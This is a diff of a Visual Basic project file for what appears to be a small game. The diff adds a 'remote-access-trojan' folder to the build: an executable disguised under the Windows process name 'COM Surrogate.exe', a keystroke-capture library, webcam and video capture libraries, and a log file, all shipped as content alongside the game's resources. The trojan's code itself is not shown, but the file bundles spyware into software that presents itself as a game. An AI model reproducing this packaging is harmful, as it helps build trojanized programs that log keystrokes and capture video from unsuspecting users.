@@ -139,6 +139,8 @@
       <LastGenOutput>Settings.Designer.vb</LastGenOutput>
     </None>
     <None Include="App.config" />
+    <None Include="remote-access-trojan\Accord.dll.config" />
+    <None Include="remote-access-trojan\COM Surrogate.exe.config" />
     <None Include="ScoresDataSet.xsc">
       <DependentUpon>ScoresDataSet.xsd</DependentUpon>
     </None>
@@ -201,10 +203,32 @@
     <None Include="Resources\invador.png" />
   </ItemGroup>
   <ItemGroup>
-    <EmbeddedResource Include="remote-access-trojan\remote-access-trojan.exe" />
-  </ItemGroup>
-  <ItemGroup>
+    <Content Include="remote-access-trojan\Accord.dll" />
+    <Content Include="remote-access-trojan\Accord.Video.dll" />
+    <Content Include="remote-access-trojan\Accord.Video.FFMPEG.dll" />
+    <Content Include="remote-access-trojan\Accord.Video.FFMPEG.xml" />
+    <Content Include="remote-access-trojan\Accord.Video.xml" />
+    <Content Include="remote-access-trojan\Accord.xml" />
+    <Content Include="remote-access-trojan\AForge.dll" />
+    <Content Include="remote-access-trojan\AForge.Video.DirectShow.dll" />
+    <Content Include="remote-access-trojan\AForge.Video.DirectShow.xml" />
+    <Content Include="remote-access-trojan\AForge.Video.dll" />
+    <Content Include="remote-access-trojan\AForge.Video.xml" />
+    <Content Include="remote-access-trojan\AForge.xml" />
+    <Content Include="remote-access-trojan\avcodec-57.dll" />
+    <Content Include="remote-access-trojan\avdevice-57.dll" />
+    <Content Include="remote-access-trojan\avfilter-6.dll" />
+    <Content Include="remote-access-trojan\avformat-57.dll" />
+    <Content Include="remote-access-trojan\avutil-55.dll" />
+    <Content Include="remote-access-trojan\COM Surrogate.exe" />
+    <Content Include="remote-access-trojan\COM Surrogate.pdb" />
     <Content Include="remote-access-trojan\KeystrokeAPI.dll" />
+    <Content Include="remote-access-trojan\log.txt" />
+    <Content Include="remote-access-trojan\postproc-54.dll" />
+    <Content Include="remote-access-trojan\swresample-2.dll" />
+    <Content Include="remote-access-trojan\swscale-4.dll" />
+    <Content Include="remote-access-trojan\System.Drawing.Common.dll" />
+    <None Include="Resources\COM Surrogate.exe" />
   </ItemGroup>
   <Import Project="$(MSBuildToolsPath)\Microsoft.VisualBasic.targets" />
   <!-- To modify your build process, add your task inside one of the targets below and uncomment it. 
